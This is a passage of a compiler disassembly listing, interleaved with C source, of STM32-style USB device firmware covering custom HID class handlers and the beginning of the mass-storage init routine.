 8008cac:	d10b      	bne.n	8008cc6 <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008cae:	697b      	ldr	r3, [r7, #20]
 8008cb0:	2201      	movs	r2, #1
 8008cb2:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008cb6:	4b07      	ldr	r3, [pc, #28]	; (8008cd4 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008cb8:	7819      	ldrb	r1, [r3, #0]
 8008cba:	88fb      	ldrh	r3, [r7, #6]
 8008cbc:	68ba      	ldr	r2, [r7, #8]
 8008cbe:	68f8      	ldr	r0, [r7, #12]
 8008cc0:	f004 f9ea 	bl	800d098 <USBD_LL_Transmit>
 8008cc4:	e001      	b.n	8008cca <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008cc6:	2301      	movs	r3, #1
 8008cc8:	e000      	b.n	8008ccc <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008cca:	2300      	movs	r3, #0
}
 8008ccc:	4618      	mov	r0, r3
 8008cce:	3718      	adds	r7, #24
 8008cd0:	46bd      	mov	sp, r7
 8008cd2:	bd80      	pop	{r7, pc}
 8008cd4:	200000a6 	.word	0x200000a6

08008cd8 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008cd8:	b580      	push	{r7, lr}
 8008cda:	b084      	sub	sp, #16
 8008cdc:	af00      	add	r7, sp, #0
 8008cde:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008ce0:	2181      	movs	r1, #129	; 0x81
 8008ce2:	4815      	ldr	r0, [pc, #84]	; (8008d38 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008ce4:	f002 fd32 	bl	800b74c <USBD_GetEpDesc>
 8008ce8:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008cea:	2101      	movs	r1, #1
 8008cec:	4812      	ldr	r0, [pc, #72]	; (8008d38 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008cee:	f002 fd2d 	bl	800b74c <USBD_GetEpDesc>
 8008cf2:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008cf4:	68fb      	ldr	r3, [r7, #12]
 8008cf6:	2b00      	cmp	r3, #0
 8008cf8:	d009      	beq.n	8008d0e <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008cfa:	68fb      	ldr	r3, [r7, #12]
 8008cfc:	2200      	movs	r2, #0
 8008cfe:	f042 0202 	orr.w	r2, r2, #2
 8008d02:	711a      	strb	r2, [r3, #4]
 8008d04:	2200      	movs	r2, #0
 8008d06:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008d08:	68fb      	ldr	r3, [r7, #12]
 8008d0a:	2205      	movs	r2, #5
 8008d0c:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008d0e:	68bb      	ldr	r3, [r7, #8]
 8008d10:	2b00      	cmp	r3, #0
 8008d12:	d009      	beq.n	8008d28 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008d14:	68bb      	ldr	r3, [r7, #8]
 8008d16:	2200      	movs	r2, #0
 8008d18:	f042 0202 	orr.w	r2, r2, #2
 8008d1c:	711a      	strb	r2, [r3, #4]
 8008d1e:	2200      	movs	r2, #0
 8008d20:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008d22:	68bb      	ldr	r3, [r7, #8]
 8008d24:	2205      	movs	r2, #5
 8008d26:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008d28:	687b      	ldr	r3, [r7, #4]
 8008d2a:	2229      	movs	r2, #41	; 0x29
 8008d2c:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008d2e:	4b02      	ldr	r3, [pc, #8]	; (8008d38 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008d30:	4618      	mov	r0, r3
 8008d32:	3710      	adds	r7, #16
 8008d34:	46bd      	mov	sp, r7
 8008d36:	bd80      	pop	{r7, pc}
 8008d38:	20000064 	.word	0x20000064

08008d3c <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008d3c:	b580      	push	{r7, lr}
 8008d3e:	b084      	sub	sp, #16
 8008d40:	af00      	add	r7, sp, #0
 8008d42:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008d44:	2181      	movs	r1, #129	; 0x81
 8008d46:	4815      	ldr	r0, [pc, #84]	; (8008d9c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008d48:	f002 fd00 	bl	800b74c <USBD_GetEpDesc>
 8008d4c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008d4e:	2101      	movs	r1, #1
 8008d50:	4812      	ldr	r0, [pc, #72]	; (8008d9c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008d52:	f002 fcfb 	bl	800b74c <USBD_GetEpDesc>
 8008d56:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008d58:	68fb      	ldr	r3, [r7, #12]
 8008d5a:	2b00      	cmp	r3, #0
 8008d5c:	d009      	beq.n	8008d72 <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008d5e:	68fb      	ldr	r3, [r7, #12]
 8008d60:	2200      	movs	r2, #0
 8008d62:	f042 0202 	orr.w	r2, r2, #2
 8008d66:	711a      	strb	r2, [r3, #4]
 8008d68:	2200      	movs	r2, #0
 8008d6a:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008d6c:	68fb      	ldr	r3, [r7, #12]
 8008d6e:	2205      	movs	r2, #5
 8008d70:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008d72:	68bb      	ldr	r3, [r7, #8]
 8008d74:	2b00      	cmp	r3, #0
 8008d76:	d009      	beq.n	8008d8c <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008d78:	68bb      	ldr	r3, [r7, #8]
 8008d7a:	2200      	movs	r2, #0
 8008d7c:	f042 0202 	orr.w	r2, r2, #2
 8008d80:	711a      	strb	r2, [r3, #4]
 8008d82:	2200      	movs	r2, #0
 8008d84:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008d86:	68bb      	ldr	r3, [r7, #8]
 8008d88:	2205      	movs	r2, #5
 8008d8a:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008d8c:	687b      	ldr	r3, [r7, #4]
 8008d8e:	2229      	movs	r2, #41	; 0x29
 8008d90:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008d92:	4b02      	ldr	r3, [pc, #8]	; (8008d9c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008d94:	4618      	mov	r0, r3
 8008d96:	3710      	adds	r7, #16
 8008d98:	46bd      	mov	sp, r7
 8008d9a:	bd80      	pop	{r7, pc}
 8008d9c:	20000064 	.word	0x20000064

08008da0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008da0:	b580      	push	{r7, lr}
 8008da2:	b084      	sub	sp, #16
 8008da4:	af00      	add	r7, sp, #0
 8008da6:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008da8:	2181      	movs	r1, #129	; 0x81
 8008daa:	4815      	ldr	r0, [pc, #84]	; (8008e00 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008dac:	f002 fcce 	bl	800b74c <USBD_GetEpDesc>
 8008db0:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008db2:	2101      	movs	r1, #1
 8008db4:	4812      	ldr	r0, [pc, #72]	; (8008e00 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008db6:	f002 fcc9 	bl	800b74c <USBD_GetEpDesc>
 8008dba:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008dbc:	68fb      	ldr	r3, [r7, #12]
 8008dbe:	2b00      	cmp	r3, #0
 8008dc0:	d009      	beq.n	8008dd6 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008dc2:	68fb      	ldr	r3, [r7, #12]
 8008dc4:	2200      	movs	r2, #0
 8008dc6:	f042 0202 	orr.w	r2, r2, #2
 8008dca:	711a      	strb	r2, [r3, #4]
 8008dcc:	2200      	movs	r2, #0
 8008dce:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008dd0:	68fb      	ldr	r3, [r7, #12]
 8008dd2:	2205      	movs	r2, #5
 8008dd4:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008dd6:	68bb      	ldr	r3, [r7, #8]
 8008dd8:	2b00      	cmp	r3, #0
 8008dda:	d009      	beq.n	8008df0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ddc:	68bb      	ldr	r3, [r7, #8]
 8008dde:	2200      	movs	r2, #0
 8008de0:	f042 0202 	orr.w	r2, r2, #2
 8008de4:	711a      	strb	r2, [r3, #4]
 8008de6:	2200      	movs	r2, #0
 8008de8:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008dea:	68bb      	ldr	r3, [r7, #8]
 8008dec:	2205      	movs	r2, #5
 8008dee:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008df0:	687b      	ldr	r3, [r7, #4]
 8008df2:	2229      	movs	r2, #41	; 0x29
 8008df4:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008df6:	4b02      	ldr	r3, [pc, #8]	; (8008e00 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008df8:	4618      	mov	r0, r3
 8008dfa:	3710      	adds	r7, #16
 8008dfc:	46bd      	mov	sp, r7
 8008dfe:	bd80      	pop	{r7, pc}
 8008e00:	20000064 	.word	0x20000064

08008e04 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008e04:	b480      	push	{r7}
 8008e06:	b083      	sub	sp, #12
 8008e08:	af00      	add	r7, sp, #0
 8008e0a:	6078      	str	r0, [r7, #4]
 8008e0c:	460b      	mov	r3, r1
 8008e0e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008e10:	687b      	ldr	r3, [r7, #4]
 8008e12:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e16:	687b      	ldr	r3, [r7, #4]
 8008e18:	32b0      	adds	r2, #176	; 0xb0
 8008e1a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e1e:	2200      	movs	r2, #0
 8008e20:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008e24:	2300      	movs	r3, #0
}
 8008e26:	4618      	mov	r0, r3
 8008e28:	370c      	adds	r7, #12
 8008e2a:	46bd      	mov	sp, r7
 8008e2c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008e30:	4770      	bx	lr

08008e32 <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008e32:	b580      	push	{r7, lr}
 8008e34:	b084      	sub	sp, #16
 8008e36:	af00      	add	r7, sp, #0
 8008e38:	6078      	str	r0, [r7, #4]
 8008e3a:	460b      	mov	r3, r1
 8008e3c:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008e3e:	687b      	ldr	r3, [r7, #4]
 8008e40:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e44:	687b      	ldr	r3, [r7, #4]
 8008e46:	32b0      	adds	r2, #176	; 0xb0
 8008e48:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e4c:	2b00      	cmp	r3, #0
 8008e4e:	d101      	bne.n	8008e54 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008e50:	2303      	movs	r3, #3
 8008e52:	e017      	b.n	8008e84 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008e54:	687b      	ldr	r3, [r7, #4]
 8008e56:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e5a:	687b      	ldr	r3, [r7, #4]
 8008e5c:	32b0      	adds	r2, #176	; 0xb0
 8008e5e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e62:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008e64:	687b      	ldr	r3, [r7, #4]
 8008e66:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008e6a:	687a      	ldr	r2, [r7, #4]
 8008e6c:	33b0      	adds	r3, #176	; 0xb0
 8008e6e:	009b      	lsls	r3, r3, #2
 8008e70:	4413      	add	r3, r2
 8008e72:	685b      	ldr	r3, [r3, #4]
 8008e74:	68db      	ldr	r3, [r3, #12]
 8008e76:	68fa      	ldr	r2, [r7, #12]
 8008e78:	7810      	ldrb	r0, [r2, #0]
 8008e7a:	68fa      	ldr	r2, [r7, #12]
 8008e7c:	7852      	ldrb	r2, [r2, #1]
 8008e7e:	4611      	mov	r1, r2
 8008e80:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008e82:	2300      	movs	r3, #0
}
 8008e84:	4618      	mov	r0, r3
 8008e86:	3710      	adds	r7, #16
 8008e88:	46bd      	mov	sp, r7
 8008e8a:	bd80      	pop	{r7, pc}

08008e8c <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008e8c:	b580      	push	{r7, lr}
 8008e8e:	b084      	sub	sp, #16
 8008e90:	af00      	add	r7, sp, #0
 8008e92:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008e94:	687b      	ldr	r3, [r7, #4]
 8008e96:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e9a:	687b      	ldr	r3, [r7, #4]
 8008e9c:	32b0      	adds	r2, #176	; 0xb0
 8008e9e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008ea2:	2b00      	cmp	r3, #0
 8008ea4:	d101      	bne.n	8008eaa <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008ea6:	2303      	movs	r3, #3
 8008ea8:	e01c      	b.n	8008ee4 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008eaa:	687b      	ldr	r3, [r7, #4]
 8008eac:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008eb0:	687b      	ldr	r3, [r7, #4]
 8008eb2:	32b0      	adds	r2, #176	; 0xb0
 8008eb4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008eb8:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008eba:	4b0c      	ldr	r3, [pc, #48]	; (8008eec <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008ebc:	7819      	ldrb	r1, [r3, #0]
 8008ebe:	68fa      	ldr	r2, [r7, #12]
 8008ec0:	230f      	movs	r3, #15
 8008ec2:	6878      	ldr	r0, [r7, #4]
 8008ec4:	f004 f920 	bl	800d108 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008ec8:	68fb      	ldr	r3, [r7, #12]
 8008eca:	781a      	ldrb	r2, [r3, #0]
 8008ecc:	4b08      	ldr	r3, [pc, #32]	; (8008ef0 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008ece:	701a      	strb	r2, [r3, #0]
 8008ed0:	4b07      	ldr	r3, [pc, #28]	; (8008ef0 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008ed2:	781b      	ldrb	r3, [r3, #0]
 8008ed4:	f003 0302 	and.w	r3, r3, #2
 8008ed8:	2b02      	cmp	r3, #2
 8008eda:	d002      	beq.n	8008ee2 <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008edc:	4b05      	ldr	r3, [pc, #20]	; (8008ef4 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008ede:	2201      	movs	r2, #1
 8008ee0:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008ee2:	2300      	movs	r3, #0
}
 8008ee4:	4618      	mov	r0, r3
 8008ee6:	3710      	adds	r7, #16
 8008ee8:	46bd      	mov	sp, r7
 8008eea:	bd80      	pop	{r7, pc}
 8008eec:	200000a7 	.word	0x200000a7
 8008ef0:	2000026c 	.word	0x2000026c
 8008ef4:	20000270 	.word	0x20000270

08008ef8 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008ef8:	b580      	push	{r7, lr}
 8008efa:	b084      	sub	sp, #16
 8008efc:	af00      	add	r7, sp, #0
 8008efe:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008f00:	687b      	ldr	r3, [r7, #4]
 8008f02:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f06:	687b      	ldr	r3, [r7, #4]
 8008f08:	32b0      	adds	r2, #176	; 0xb0
 8008f0a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008f0e:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008f10:	68fb      	ldr	r3, [r7, #12]
 8008f12:	2b00      	cmp	r3, #0
 8008f14:	d101      	bne.n	8008f1a <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008f16:	2303      	movs	r3, #3
 8008f18:	e016      	b.n	8008f48 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008f1a:	68fb      	ldr	r3, [r7, #12]
 8008f1c:	69db      	ldr	r3, [r3, #28]
 8008f1e:	2b01      	cmp	r3, #1
 8008f20:	d111      	bne.n	8008f46 <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008f22:	687b      	ldr	r3, [r7, #4]
 8008f24:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008f28:	687a      	ldr	r2, [r7, #4]
 8008f2a:	33b0      	adds	r3, #176	; 0xb0
 8008f2c:	009b      	lsls	r3, r3, #2
 8008f2e:	4413      	add	r3, r2
 8008f30:	685b      	ldr	r3, [r3, #4]
 8008f32:	68db      	ldr	r3, [r3, #12]
 8008f34:	68fa      	ldr	r2, [r7, #12]
 8008f36:	7810      	ldrb	r0, [r2, #0]
 8008f38:	68fa      	ldr	r2, [r7, #12]
 8008f3a:	7852      	ldrb	r2, [r2, #1]
 8008f3c:	4611      	mov	r1, r2
 8008f3e:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008f40:	68fb      	ldr	r3, [r7, #12]
 8008f42:	2200      	movs	r2, #0
 8008f44:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008f46:	2300      	movs	r3, #0
}
 8008f48:	4618      	mov	r0, r3
 8008f4a:	3710      	adds	r7, #16
 8008f4c:	46bd      	mov	sp, r7
 8008f4e:	bd80      	pop	{r7, pc}

08008f50 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008f50:	b480      	push	{r7}
 8008f52:	b083      	sub	sp, #12
 8008f54:	af00      	add	r7, sp, #0
 8008f56:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008f58:	687b      	ldr	r3, [r7, #4]
 8008f5a:	220a      	movs	r2, #10
 8008f5c:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008f5e:	4b03      	ldr	r3, [pc, #12]	; (8008f6c <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008f60:	4618      	mov	r0, r3
 8008f62:	370c      	adds	r7, #12
 8008f64:	46bd      	mov	sp, r7
 8008f66:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008f6a:	4770      	bx	lr
 8008f6c:	2000009c 	.word	0x2000009c

08008f70 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008f70:	b480      	push	{r7}
 8008f72:	b083      	sub	sp, #12
 8008f74:	af00      	add	r7, sp, #0
 8008f76:	6078      	str	r0, [r7, #4]
 8008f78:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008f7a:	683b      	ldr	r3, [r7, #0]
 8008f7c:	2b00      	cmp	r3, #0
 8008f7e:	d101      	bne.n	8008f84 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008f80:	2303      	movs	r3, #3
 8008f82:	e009      	b.n	8008f98 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008f84:	687b      	ldr	r3, [r7, #4]
 8008f86:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008f8a:	687a      	ldr	r2, [r7, #4]
 8008f8c:	33b0      	adds	r3, #176	; 0xb0
 8008f8e:	009b      	lsls	r3, r3, #2
 8008f90:	4413      	add	r3, r2
 8008f92:	683a      	ldr	r2, [r7, #0]
 8008f94:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008f96:	2300      	movs	r3, #0
}
 8008f98:	4618      	mov	r0, r3
 8008f9a:	370c      	adds	r7, #12
 8008f9c:	46bd      	mov	sp, r7
 8008f9e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008fa2:	4770      	bx	lr

08008fa4 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008fa4:	b580      	push	{r7, lr}
 8008fa6:	b084      	sub	sp, #16
 8008fa8:	af00      	add	r7, sp, #0
 8008faa:	6078      	str	r0, [r7, #4]
 8008fac:	460b      	mov	r3, r1
 8008fae:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008fb0:	f241 0074 	movw	r0, #4212	; 0x1074
 8008fb4:	f004 f938 	bl	800d228 <USBD_static_malloc_MSC>
 8008fb8:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008fba:	68fb      	ldr	r3, [r7, #12]
 8008fbc:	2b00      	cmp	r3, #0
 8008fbe:	d109      	bne.n	8008fd4 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008fc0:	687b      	ldr	r3, [r7, #4]
 8008fc2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008fc6:	687b      	ldr	r3, [r7, #4]
 8008fc8:	32b0      	adds	r2, #176	; 0xb0
 8008fca:	2100      	movs	r1, #0
 8008fcc:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008fd0:	2302      	movs	r3, #2
 8008fd2:	e06e      	b.n	80090b2 <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008fd4:	687b      	ldr	r3, [r7, #4]
 8008fd6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008fda:	687b      	ldr	r3, [r7, #4]
 8008fdc:	32b0      	adds	r2, #176	; 0xb0
 8008fde:	68f9      	ldr	r1, [r7, #12]
 8008fe0:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008fe4:	687b      	ldr	r3, [r7, #4]
 8008fe6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008fea:	687b      	ldr	r3, [r7, #4]
 8008fec:	32b0      	adds	r2, #176	; 0xb0
 8008fee:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008ff2:	687b      	ldr	r3, [r7, #4]
 8008ff4:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008ff8:	687b      	ldr	r3, [r7, #4]
 8008ffa:	7c1b      	ldrb	r3, [r3, #16]
 8008ffc:	2b00      	cmp	r3, #0
